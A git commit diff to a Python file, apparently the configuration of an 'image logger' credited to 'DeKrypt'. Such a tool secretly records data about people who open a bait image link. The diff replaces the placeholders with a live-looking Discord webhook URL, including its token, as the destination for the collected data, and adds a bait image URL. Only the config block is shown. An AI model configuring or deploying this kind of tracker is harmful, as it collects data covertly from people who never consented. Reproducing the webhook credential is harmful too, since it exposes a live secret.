7280676e4d819072ffa3871435bcf97219926ff4
SMOKYing <mcay0805@gmail.com>
2025-11-29 21:44:45 +0100

    Update hi.py

--- hi.py
+++ hi.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1444427929097338900/jDnTmohHyxy4ZXlqtnyYj5LkpU-bhaqgnIa1HkEw-VweeMbsuP0Cmcg18ZNBJLEpraoY",
+    "image": "https://img.freepik.com/premium-photo/dark-beauty-style-gothic-black-white_583952-7456.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
